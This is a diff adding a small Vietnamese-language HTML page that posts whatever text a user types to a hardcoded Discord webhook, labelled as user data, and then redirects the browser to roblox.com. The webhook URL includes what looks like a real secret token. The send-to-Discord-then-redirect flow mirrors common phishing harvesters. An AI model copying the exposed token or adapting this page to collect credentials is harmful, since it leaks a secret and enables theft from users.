@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Gửi dữ liệu đến webhook</title>
+</head>
+<body style="display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif;">
+
+  <input id="myInput" type="text" placeholder="Nhập văn bản cần gửi" style="padding: 10px; width: 300px; font-size: 16px; margin-bottom: 20px;" />
+  <button onclick="sendData()" style="padding: 10px 20px; font-size: 16px; background-color: #4CAF50; color: white; border: none; border-radius: 6px;">Gửi đến webhook</button>
+
+  <script>
+    function sendData() {
+      const inputValue = document.getElementById("myInput").value;
+      const webhookURL = "https://discord.com/api/webhooks/1364096814919454730/Y0bWQllAa_JKq_aVcRjKnWtkzu08LukIa6sAKqzB15zEUUEBL2U5NlE9wGbkbQfT-1tD"; // 👉 Thay bằng URL webhook thật
+
+      if (!inputValue) {
+        alert("Vui lòng nhập văn bản.");
+        return;
+      }
+
+      fetch(webhookURL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          content: "Dữ liệu người dùng: " + inputValue
+        })
+      })
+      .then(() => {
+        // Sau khi gửi xong, chuyển hướng
+        window.location.href = "https://roblox.com"; // 👉 Đổi URL nếu muốn chuyển đến nơi khác
+      })
+      .catch(err => {
+        alert("Lỗi khi gửi: " + err);
+      });
+    }
+  </script>
+</body>
+</html>
